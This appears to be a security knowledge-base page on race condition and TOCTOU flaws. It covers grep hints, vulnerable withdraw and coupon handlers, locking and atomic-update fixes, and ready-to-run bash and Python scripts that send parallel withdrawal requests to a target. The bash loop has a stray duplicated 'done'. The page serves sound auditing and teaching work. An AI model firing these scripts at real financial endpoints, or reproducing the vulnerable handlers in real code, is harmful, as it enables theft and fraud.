# Race Condition & TOCTOU

**Tags:** #high #race-condition #toctou #concurrency #transaction
**OWASP:** A04:2021 Insecure Design
**CVSS Base:** 8.1 (High — financial fraud, privilege escalation)

---

## 📖 What it is

**Race Condition:** the system checks a condition at one point in time and acts on it at a later point. In the interval between the two, an attacker violates the premise.

**TOCTOU (Time of Check / Time of Use):** the technical name for the pattern — the "check" (verification) and the "use" (action) are separated in time without protection.

---

## 🔍 `grep_search` Tactics

```
beginTransaction
lock
mutex
SELECT FOR UPDATE
FOR UPDATE
LOCK IN SHARE MODE
.lock()
synchronized
Lock()
threading.Lock
asyncio.Lock
```

**The ABSENCE** of these terms in critical flows is the **warning sign**.

---

## 🎯 High-Risk Contexts

| Feature | Risk |
|---|---|
| Coupon/voucher system | Using the same coupon multiple times |
| Withdrawals/transfers | Withdrawing more than the available balance |
| Login attempt limits | Bypassing rate limiting |
| Unique token generation | Generating duplicates |
| Purchase limits ("1 per user") | Buying multiple |
| Transaction approval | Double approval |
| Account creation | Duplicating a user with the same email |

---

## 💣 Exploit Example

### Over-withdrawal (the classic example)

```python
#  VULNERABLE  check-then-act pattern without transactional lock
@app.post('/withdraw')
@login_required
def withdraw():
    amount = request.json['amount']
    user = User.query.get(current_user.id)
    
    # CHECK: verify balance
    if user.balance < amount:
        return jsonify({"error": "Insufficient balance"}), 400
    
    #  EXPLOITATION WINDOW: 50 parallel requests reach here
    #   All passed the check with a balance of $100
    
    # USE: debit
    user.balance -= amount
    db.session.commit()
    #  50 withdrawals of $100 with an initial balance of $100 = -$4900
```

**Test tool:**
```bash
# Send 50 simultaneous requests with curl
for i in {1..50}; do
    curl -s -X POST http://target.com/withdraw \
         -H "Authorization: Bearer $TOKEN" \
         -H "Content-Type: application/json" \
         -d '{"amount": 100}' &
done
done
wait
```

### [NEW] Single-Packet Attack (HTTP/2)
**How it works:** Instead of sending multiple requests (which have network jitter), an attacker uses HTTP/2 to send multiple streams in a single TCP packet. This ensures that the backend processes them almost simultaneously, drastically increasing the success rate.
**Tool:** Burp Suite "Turbo Intruder" or custom H2 scripts.

---

### Reusable Coupon via Race Condition

```python
#  VULNERABLE
def apply_coupon(code: str, user_id: int):
    coupon = Coupon.objects.get(code=code)
    
    # CHECK: has this coupon already been used by this user?
    if CouponUsage.objects.filter(coupon=coupon, user_id=user_id).exists():
        return "Coupon already used"
    
    #  WINDOW: 20 simultaneous requests passed the check
    
    # USE: record usage and apply discount
    CouponUsage.objects.create(coupon=coupon, user_id=user_id)
    apply_discount(user_id, coupon.discount)
```

---

## ✅ Fix by Pattern

### Database Lock (SELECT FOR UPDATE)

```python
#  CORRECT  transaction with row-level lock
from django.db import transaction

@transaction.atomic
def withdraw(user_id, amount):
    # SELECT FOR UPDATE: locks the row until commit
    user = User.objects.select_for_update().get(id=user_id)
    
    if user.balance < amount:
        raise ValueError("Insufficient balance")
    
    user.balance -= amount
    user.save()
    # Lock released here when the transaction commits
```

```python
#  SQLAlchemy
with db.session.begin():
    user = db.session.query(User).with_for_update().filter_by(id=user_id).one()
    if user.balance < amount:
        raise ValueError("Insufficient balance")
    user.balance -= amount
```

### Atomic Database Operation

```sql
--  Atomic UPDATE  no exploitation window
UPDATE accounts 
SET balance = balance - 100
WHERE user_id = 42 AND balance >= 100;
-- If 0 rows affected  insufficient balance (no race)
```

```python
#  Django ORM with F()  atomic operation
from django.db.models import F
rows = User.objects.filter(id=user_id, balance__gte=amount).update(
    balance=F('balance') - amount
)
if rows == 0:
    raise ValueError("Insufficient balance")
```

### Redis + Lua Script (Atomic)

```python
#  Redis as distributed lock
import redis

r = redis.Redis()
lock_key = f"lock:withdraw:{user_id}"
lock_timeout = 5  # seconds

# SETNX = set if not exists  atomic
with r.lock(lock_key, timeout=lock_timeout):
    # Protected operation
    update_balance(user_id, amount)
```

### For Coupons: INSERT with UNIQUE Constraint

```sql
--  Database constraint prevents race condition
CREATE UNIQUE INDEX unique_coupon_usage 
ON coupon_usages(coupon_id, user_id);

-- The database automatically rejects the second INSERT,
-- regardless of request speed
```

---

## 🧪 Race Condition Test Script

```python
# .tmp/test_race_condition.py
import requests
import threading
import time

TARGET = "http://target.com"
TOKEN  = "eyJ..."
ENDPOINT = "/api/withdraw"
AMOUNT = 100        # Initial balance: $100
THREADS = 20        # Send 20 simultaneous withdrawals

results = []

def make_request():
    r = requests.post(
        f"{TARGET}{ENDPOINT}",
        json={"amount": AMOUNT},
        headers={"Authorization": f"Bearer {TOKEN}"},
        timeout=10
    )
    results.append(r.status_code)

# Create threads
threads = [threading.Thread(target=make_request) for _ in range(THREADS)]

# Fire all simultaneously
start = time.time()
for t in threads:
    t.start()
for t in threads:
    t.join()
end = time.time()

print(f"\n=== Race Condition Test ===")
print(f"Threads: {THREADS} | Time: {end-start:.2f}s")
success = results.count(200)
print(f"Successful requests (200): {success}/{THREADS}")
if success > 1:
    print(f"[VULN] Race Condition confirmed! {success} withdrawals of ${AMOUNT} with initial balance ${AMOUNT}")
    print(f"       Total possible loss: ${(success-1) * AMOUNT}")
else:
    print("[OK] Only 1 successful withdrawal  possible protection in place")
```

---

## 🔗 Chain Exploits

```
Race Condition on withdrawal  Infinite negative balance  Financial fraud
Race Condition on coupon  100% discount on all purchases
Race Condition on API limit  DDoS of paid feature
Race Condition on unique token generation  Token collision  Account Takeover
TOCTOU on file check  write before check  Privilege Escalation
```

---

## 📌 References
- [[business-logic-flaws]]
- [[idor-bola-broken-object-level-authorization]]
- [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions)